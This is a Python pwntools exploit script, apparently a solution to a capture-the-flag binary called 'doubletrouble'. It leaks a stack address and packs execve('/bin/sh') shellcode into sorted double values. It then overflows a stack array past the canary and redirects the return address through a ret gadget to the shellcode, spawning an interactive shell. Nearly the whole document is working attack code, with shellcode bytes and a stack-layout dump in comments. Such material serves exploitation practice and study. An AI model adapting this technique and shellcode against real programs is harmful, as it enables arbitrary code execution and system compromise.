from pwn import *
import struct

p = process(['./doubletrouble'])

ud = lambda x: struct.unpack('<d',(x).to_bytes(8,byteorder='little'))[0] # int to double
ib = lambda x: int.from_bytes((x),'little') # byte string to int

stack = int(p.recvuntil(b"\n",drop=True),16)
scadr = stack + 0x1d8

ret = "0x8049010" + hex(scadr).replace("0x", "")
jmp_stack = int(ret, 16)


log.success('Our Buffer address: ' + hex(stack))

# End of array to ret address is 8 word -> 4 index of double
# 0xfffe26f8│+0x0238: 0xfffe2718  →  0x00000000
# 0xfffe26fc│+0x023c: 0x7b2ee500  →  (canary)
# 0xfffe2700│+0x0240: 0x0804c000  →  0x0804bf04  →  0x00000001
# 0xfffe2704│+0x0244: 0xf7f6b000  →  0x001ead6c
# 0xfffe2708│+0x0248: 0xfffe2718  →  0x00000000	 ← $ebp
# 0xfffe270c│+0x024c: 0x08049841  →  <main+55> mov eax, 0x0 → (Return address)

# http://shell-storm.org/shellcode/files/shellcode-599.html
# But we need to modify out shellcode to become ascending, we can padd using 0x90 (nop) to adjust the value
# shellcode does the following:
# '''
# xor    ecx,ecx
# mul    ecx
# push   ecx
# jmp    0xffff7ca8
# xchg   ecx,eax
# push   0x68732f2f
# nop
# nop
# nop
# push   0x6e69622f
# inc    eax
# nop
# nop
# mov    ebx,esp
# mov    al,0xb
# int    0x80
# '''

shell = [b'\x31\xc9\xf7\xe1\x51\xeb\x01\x91',b'\x68\x2f\x2f\x73\x68\x90\x90\x90',b'\x68\x2f\x62\x69\x6e\x40\x90\x90',b'\x89\xe3\xb0\x0b\xcd\x80\x00\x90']

p.sendlineafter(b'long: ',b'64')

# gdb.attach(p,gdbscript="""init-gef
# br *0x080496fa
# br *0x08049733""")

ret_gadget = 0x0804900a
filler = 0xff820d8400000000

for i in range(5):
    p.sendlineafter(b'me: ',str(ud(filler)).encode()) # padding

p.sendlineafter(b'me: ',b'-23') # to trigger change size value

for s in shell:
    p.sendlineafter(b'me: ',str(ud(ib(s))).encode())

for i in range(51):
    p.sendlineafter(b'me: ',str(ud(filler)).encode()) # To fill array using 'ret' gadget

p.sendlineafter(b'me: ',str(ud(0x0800000000000000)).encode())
p.sendlineafter(b'me: ',str(ud(jmp_stack)).encode())
p.sendlineafter(b'me: ',str(ud(ret_gadget)).encode())

# p.sendlineafter(b'me: ',str(ud(ib(b'BBBBBBBB'))).encode()) # To fill array
# p.sendlineafter(b"me: ",b'-23')

p.interactive()